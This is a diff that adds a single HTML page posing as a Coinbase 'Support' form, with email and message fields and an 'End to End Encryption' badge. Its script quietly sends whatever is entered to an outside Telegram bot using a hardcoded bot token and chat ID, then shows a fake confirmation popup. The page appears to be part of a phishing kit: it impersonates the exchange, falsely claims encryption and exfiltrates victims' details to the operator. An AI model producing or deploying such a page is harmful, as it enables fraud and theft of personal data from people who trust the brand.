@@ -1,0 +1,375 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Support - Coinbase</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Inter', sans-serif;
+      background-color: #000;
+      color: white;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      padding: 40px 20px;
+      box-sizing: border-box;
+      overflow-x: hidden;
+    }
+
+    .top-right {
+      position: absolute;
+      top: 20px;
+      right: 20px;
+    }
+
+    .top-right a {
+      color: #4c8ffb;
+      font-weight: 500;
+      text-decoration: none;
+      font-size: 15px;
+      transition: color 0.3s ease;
+    }
+
+    .top-right a:hover {
+      color: #ffffff;
+    }
+
+    .support-container {
+      width: 100%;
+      max-width: 400px;
+      text-align: center;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      background: #1a1a1a;
+      padding: 30px;
+      border-radius: 12px;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
+      animation: fadeIn 0.5s ease-in-out;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    .support-title {
+      font-size: 28px;
+      font-weight: 700;
+      margin-bottom: 15px;
+      color: #ffffff;
+    }
+
+    .support-text {
+      font-size: 14px;
+      color: #cccccc;
+      margin-bottom: 25px;
+      line-height: 1.6;
+      font-weight: 400;
+    }
+
+    .form-group {
+      margin-bottom: 20px;
+      text-align: left;
+      width: 100%;
+    }
+
+    .form-group label {
+      display: block;
+      font-size: 14px;
+      font-weight: 500;
+      margin-bottom: 8px;
+      color: #ffffff;
+    }
+
+    .form-group input,
+    .form-group textarea {
+      width: 100%;
+      padding: 12px;
+      border: none;
+      border-radius: 8px;
+      background-color: #2c2c2c;
+      color: white;
+      font-size: 14px;
+      box-sizing: border-box;
+      transition: background-color 0.3s ease, box-shadow 0.3s ease;
+      resize: none;
+    }
+
+    .form-group input:focus,
+    .form-group textarea:focus {
+      outline: none;
+      background-color: #333333;
+      box-shadow: 0 0 0 2px #4c8ffb;
+    }
+
+    .form-group input::placeholder,
+    .form-group textarea::placeholder {
+      color: #888888;
+    }
+
+    .btn {
+      width: 100%;
+      padding: 14px;
+      border: none;
+      border-radius: 32px;
+      font-size: 15px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background-color 0.3s ease, transform 0.2s ease;
+      position: relative;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .btn-primary {
+      background-color: #4c8ffb;
+      color: #000000;
+    }
+
+    .btn-primary:hover {
+      background-color: #367af6;
+      transform: translateY(-2px);
+    }
+
+    .btn.loading .btn-text {
+      visibility: hidden;
+    }
+
+    .btn.loading::after {
+      content: '';
+      position: absolute;
+      width: 20px;
+      height: 20px;
+      border: 3px solid #000000;
+      border-top: 3px solid transparent;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    /* End to End Encryption Text with CSS Padlock */
+    .encryption-text {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      font-size: 12px;
+      color: #888888;
+      margin-top: 20px;
+      margin-bottom: 20px;
+      text-align: center;
+      font-weight: 400;
+    }
+
+    .padlock {
+      width: 16px;
+      height: 20px;
+      position: relative;
+      display: inline-block;
+      filter: brightness(0.7);
+    }
+
+    .padlock::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 4px;
+      width: 8px;
+      height: 8px;
+      border: 2px solid #888888;
+      border-bottom: none;
+      border-radius: 8px 8px 0 0;
+      animation: lock-shackle 0.5s ease-in-out;
+    }
+
+    .padlock::after {
+      content: '';
+      position: absolute;
+      top: 8px;
+      left: 0;
+      width: 16px;
+      height: 12px;
+      background: #888888;
+      border-radius: 2px;
+      box-shadow: 0 0 8px rgba(136, 136, 136, 0.5);
+    }
+
+    @keyframes lock-shackle {
+      0% { transform: translateY(2px); }
+      50% { transform: translateY(-2px); }
+      100% { transform: translateY(0); }
+    }
+
+    /* Popup Styles */
+    .popup-overlay {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.8);
+      justify-content: center;
+      align-items: center;
+      z-index: 1000;
+      animation: fadeInOverlay 0.3s ease;
+    }
+
+    @keyframes fadeInOverlay {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+
+    .popup {
+      background: #1a1a1a;
+      padding: 25px;
+      border-radius: 12px;
+      text-align: center;
+      width: 90%;
+      max-width: 320px;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
+      animation: popupScale 0.3s ease;
+    }
+
+    @keyframes popupScale {
+      from { transform: scale(0.9); opacity: 0; }
+      to { transform: scale(1); opacity: 1; }
+    }
+
+    .popup h2 {
+      font-size: 20px;
+      font-weight: 600;
+      margin-bottom: 12px;
+      color: #4c8ffb;
+    }
+
+    .popup p {
+      font-size: 14px;
+      color: #cccccc;
+      margin-bottom: 20px;
+      line-height: 1.6;
+      font-weight: 400;
+    }
+
+    .popup .btn {
+      width: 100%;
+      padding: 12px;
+    }
+  </style>
+</head>
+<body>
+  <div class="top-right">
+    <a href="index.html">Back to Home</a>
+  </div>
+
+  <div class="support-container">
+    <h1 class="support-title">Support</h1>
+    <p class="support-text">
+      Need help? Submit your query below, and our support team will get back to you as soon as possible.
+    </p>
+
+    <form id="support-form" action="#">
+      <div class="form-group">
+        <label for="email">Email Address</label>
+        <input type="email" id="email" name="email" placeholder="Enter your email" required />
+      </div>
+      <div class="form-group">
+        <label for="message">Message</label>
+        <textarea id="message" name="message" placeholder="Describe your issue or question" rows="5" required></textarea>
+      </div>
+      <button type="submit" id="submit-btn" class="btn btn-primary">
+        <span class="btn-text">Submit</span>
+      </button>
+    </form>
+
+    <div class="encryption-text">
+      <span class="padlock"></span>
+      End to End Encryption
+    </div>
+  </div>
+
+  <div class="popup-overlay" id="popup-overlay">
+    <div class="popup">
+      <h2>Support Request Submitted</h2>
+      <p>Your support request has been successfully submitted. We’ll get back to you soon. Return to the home page to continue.</p>
+      <button id="popup-btn" class="btn btn-primary">
+        <span class="btn-text">Return to Home</span>
+      </button>
+    </div>
+  </div>
+
+  <script>
+    document.getElementById('support-form').addEventListener('submit', async function(event) {
+      event.preventDefault();
+      const email = document.getElementById('email').value;
+      const message = document.getElementById('message').value;
+      const submitBtn = document.getElementById('submit-btn');
+      const popupOverlay = document.getElementById('popup-overlay');
+
+      // Validation
+      if (!email.includes('@')) {
+        alert('Please enter a valid email address.');
+        return;
+      }
+      if (message.trim().length < 10) {
+        alert('Please enter a message with at least 10 characters.');
+        return;
+      }
+
+      submitBtn.classList.add('loading');
+      submitBtn.disabled = true;
+
+      // Send to Telegram
+      const telegramMessage = `Support Request\nEmail: ${email}\nMessage: ${message}`;
+      const botToken = '7941038958:AAEjfxGzJr8zjVl9JiumnMiIBoTZRR7os7g'; // Your bot token
+      const chatId = '7968566350'; // Your chat ID
+      const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(telegramMessage)}`;
+
+      try {
+        const response = await fetch(url);
+        if (response.ok) {
+          console.log('Message sent to Telegram');
+          setTimeout(() => {
+            submitBtn.classList.remove('loading');
+            submitBtn.disabled = false;
+            popupOverlay.style.display = 'flex'; // Show popup after Telegram submission
+          }, 4000);
+        } else {
+          console.error('Failed to send message to Telegram');
+          alert('Failed to send message to Telegram');
+          submitBtn.classList.remove('loading');
+          submitBtn.disabled = false;
+          popupOverlay.style.display = 'flex';
+        }
+      } catch (error) {
+        console.error('Error:', error);
+        alert('Error sending message: ' + error.message);
+        submitBtn.classList.remove('loading');
+        submitBtn.disabled = false;
+        popupOverlay.style.display = 'flex';
+      }
+    });
+
+    document.getElementById('popup-btn').addEventListener('click', function() {
+      const popupBtn = document.getElementById('popup-btn');
+      popupBtn.classList.add('loading');
+      popupBtn.disabled = true;
+
+      setTimeout(() => {
+        window.location.href = 'index.html';
+      }, 4000);
+    });
+  </script>
+</body>
+</html>
